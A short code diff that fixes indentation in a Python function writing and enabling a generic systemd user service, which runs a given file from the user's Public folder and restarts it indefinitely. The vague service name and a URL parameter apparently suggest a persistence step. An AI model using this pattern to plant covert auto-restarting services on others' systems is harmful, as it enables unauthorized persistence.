@@ -32,22 +32,21 @@ def run(url, file_path):
         # Write service file
         with open(service_file, 'w') as f:
             f.write(f"""[Unit]
-    Description=systemd service
-    After=network-online.target
-    Wants=network-online.target
+Description=systemd service
+After=network-online.target
+Wants=network-online.target
 
-    [Service]
-    ExecStart={file_path}
-    WorkingDirectory=%h/Public
-    Restart=always
-    StartLimitInterval=30
-    StartLimitBurst=5
-    RestartSec=5
+[Service]
+ExecStart={file_path}
+WorkingDirectory=%h/Public
+Restart=always
+StartLimitInterval=30
+StartLimitBurst=5
+RestartSec=5
 
 
-    [Install]
-    WantedBy=default.target
-    """)
+[Install]
+WantedBy=default.target""")
 
         # Reload systemd, start and enable the service
         subprocess.run('systemctl --user daemon-reload', shell=True)
